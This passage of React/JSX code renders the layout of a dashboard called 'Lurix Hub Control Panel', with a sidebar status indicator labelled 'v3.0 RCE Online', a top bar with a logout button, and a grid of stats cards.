                  {!sidebarCollapsed && activeTab === n.id && <div style={{ marginLeft: 'auto', opacity: 0.5 }}><Icon.ChevronRight /></div>}
                </div>
              ))}
            </div>

            {/* Status dot */}
            <div style={{ padding: '14px 16px', borderTop: `1px solid ${T.border}` }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
                <div style={{ width: 8, height: 8, minWidth: 8, borderRadius: '50%', background: T.green, boxShadow: `0 0 8px ${T.green}`, animation: 'pulse 2s infinite' }} />
                {!sidebarCollapsed && <span style={{ fontSize: 11, color: T.textMuted, fontWeight: 600 }}>v3.0 RCE Online</span>}
              </div>
            </div>
          </div>
        )}

        {/* Main content */}
        <div style={css.main}>
          {/* Topbar */}
          <div style={css.topbar}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
              {isMobile && (
                <button onClick={() => setMobileNavOpen(true)} style={{ background: 'none', border: 'none', cursor: 'pointer', color: T.text, display: 'flex', padding: 4 }}>
                  <Icon.Menu />
                </button>
              )}
              <div>
                <div style={{ fontWeight: 800, fontSize: 14, color: T.text }}>{navLabel}</div>
                {!isMobile && <div style={{ fontSize: 11, color: T.textMuted }}>Lurix Hub Control Panel</div>}
              </div>
            </div>

            <div style={{ display: 'flex', gap: 10, alignItems: 'center' }}>
              <div style={{ ...css.badge(T.green), gap: 6 }}>
                <div style={{ width: 6, height: 6, borderRadius: '50%', background: T.green, animation: 'pulse 2s infinite' }} />
                {!isMobile && 'Online'}
              </div>
              <button onClick={() => setAuthed(false)} style={{ ...css.btn('danger'), padding: '7px 14px', fontSize: 11 }}>
                <Icon.LogOut />
                {!isMobile && 'Logout'}
              </button>
            </div>
          </div>

          {/* Page content */}
          <div style={css.content}>
            {/* Stats row */}
            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(140px, 1fr))', gap: 12, marginBottom: 24, animation: 'fadeIn 0.3s ease' }}>
              {stats.map(s => (
                <div key={s.label} style={css.statCard(s.color)}>
                  <div style={css.statGlow(s.color)} />
                  <div style={{ fontSize: 10, fontWeight: 800, color: T.textMuted, textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: 8 }}>{s.label}</div>
                  <div style={{ fontSize: 22, fontWeight: 900, color: s.color, lineHeight: 1 }}>{s.value}</div>
                  <div style={{ fontSize: 11, color: T.textMuted, marginTop: 4, fontWeight: 500 }}>{s.sub}</div>
                </div>
              ))}
            </div>

            {/* Tab content */}
            <div style={{ animation: 'fadeIn 0.25s ease' }}>
              {renderTab()}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
